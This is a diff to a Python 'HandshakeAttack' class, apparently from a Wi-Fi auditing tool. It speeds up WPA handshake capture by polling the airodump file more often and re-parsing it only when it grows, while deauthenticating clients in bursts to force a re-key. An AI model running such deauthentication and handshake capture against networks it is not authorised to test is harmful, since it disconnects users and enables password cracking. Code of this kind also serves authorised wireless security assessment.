@@ -114,6 +114,7 @@ class HandshakeAttack(Attack):
 
         try:
             last_burst = 0.0
+            last_size = -1
             while not ctx.want_stop():
                 elapsed = time.time() - started
                 remaining = timeout - elapsed
@@ -123,20 +124,25 @@ class HandshakeAttack(Attack):
                 for line in proc.lines[-40:]:
                     if "WPA handshake:" in line and ap.bssid in line.lower():
                         handshake_seen = True
-                if os.path.exists(cap_path):
-                    with contextlib.suppress(OSError):
-                        if os.path.getsize(cap_path) > 0:
-                            from ..pcap import analyze_file
-                            analysis = analyze_file(cap_path, max_packets=60000)
-                            if analysis.has_handshake:
-                                handshake_seen = True
-                            ctx.progress(
-                                f"capturing {ap.display_name}", kind="capture", bssid=ap.bssid,
-                                percent=min(95, elapsed / max(1, timeout) * 100),
-                                detail=(f"EAPOL {analysis.eapol_messages}, "
-                                        f"clients {len(ap.clients)}, "
-                                        f"{int(remaining)}s left"),
-                            )
+                # re-analyse only when the capture actually grew: polling
+                # at 0.25s then notices a completed handshake up to ~0.75s
+                # sooner than the old 1s loop, without re-parsing an
+                # unchanged file four times a second
+                with contextlib.suppress(OSError):
+                    size = os.path.getsize(cap_path)
+                    if size > 0 and size != last_size:
+                        last_size = size
+                        from ..pcap import analyze_file
+                        analysis = analyze_file(cap_path, max_packets=60000)
+                        if analysis.has_handshake:
+                            handshake_seen = True
+                        ctx.progress(
+                            f"capturing {ap.display_name}", kind="capture", bssid=ap.bssid,
+                            percent=min(95, elapsed / max(1, timeout) * 100),
+                            detail=(f"EAPOL {analysis.eapol_messages}, "
+                                    f"clients {len(ap.clients)}, "
+                                    f"{int(remaining)}s left"),
+                        )
                 if handshake_seen:
                     break
                 # deauth in bursts to force a re-key
@@ -146,7 +152,7 @@ class HandshakeAttack(Attack):
                     # reconnect is a smaller, quieter ask than a broadcast burst
                     deauth_done += ctx.deauth(ap, client=client,
                                               broadcast=self.broadcast)
-                time.sleep(1.0)
+                time.sleep(0.25)
         finally:
             with contextlib.suppress(Exception):
                 proc.stop()
@@ -154,7 +160,18 @@ class HandshakeAttack(Attack):
                 pass
 
         if handshake_seen:
-            time.sleep(1.5)   # let airodump flush the last frames
+            # airodump is stopped and reaped; wait for the file to settle
+            # instead of a fixed flush nap (settles in ~0.2s typically,
+            # still capped at the old 1.5s for slow storage)
+            settle_deadline = time.time() + 1.5
+            settle_size = -1
+            while time.time() < settle_deadline:
+                with contextlib.suppress(OSError):
+                    size = os.path.getsize(cap_path)
+                    if size > 0 and size == settle_size:
+                        break
+                    settle_size = size
+                time.sleep(0.15)
         valid, summary, analysis = (False, "no capture file", None)
         if os.path.exists(cap_path):
             valid, summary, analysis = ctx.validate_capture(cap_path, "handshake")
